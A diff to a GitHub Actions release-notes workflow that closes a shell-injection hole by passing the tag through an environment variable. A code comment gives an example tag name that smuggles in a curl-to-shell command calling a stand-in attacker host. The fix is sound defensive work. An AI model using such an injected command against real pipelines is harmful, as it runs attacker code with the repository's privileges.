@@ -55,15 +55,24 @@ jobs:
           fi
 
       - name: Write the notes
+        # The tag arrives through the environment, never interpolated into the
+        # script. `${{ }}` is substituted before the shell sees the line, so a
+        # tag named `v1.0.0"; curl evil.sh | sh; "` would be run rather than
+        # passed — and a tag name is chosen by whoever pushes it.
+        env:
+          TAG: ${{ steps.about.outputs.tag }}
         run: |
+          set -euo pipefail
           python3 .github/scripts/release_notes.py \
-            "${{ steps.about.outputs.tag }}" \
-            --repo "${GITHUB_REPOSITORY}" \
-            > "${RUNNER_TEMP}/notes.md"
+            "$TAG" \
+            --repo "$GITHUB_REPOSITORY" \
+            > "$RUNNER_TEMP/notes.md"
 
           # Worth seeing in the log even when the release publishes fine.
-          echo "## ${{ steps.about.outputs.tag }}" >> "$GITHUB_STEP_SUMMARY"
-          cat "${RUNNER_TEMP}/notes.md" >> "$GITHUB_STEP_SUMMARY"
+          {
+            echo "## $TAG"
+            cat "$RUNNER_TEMP/notes.md"
+          } >> "$GITHUB_STEP_SUMMARY"
 
       - name: Publish it
         env:
@@ -72,7 +81,7 @@ jobs:
           PRERELEASE: ${{ steps.about.outputs.prerelease }}
         run: |
           set -euo pipefail
-          flags=(--title "${TAG}" --notes-file "${RUNNER_TEMP}/notes.md")
+          flags=(--title "$TAG" --notes-file "$RUNNER_TEMP/notes.md")
           if [[ "${PRERELEASE}" == "true" ]]; then
             flags+=(--prerelease)
           fi
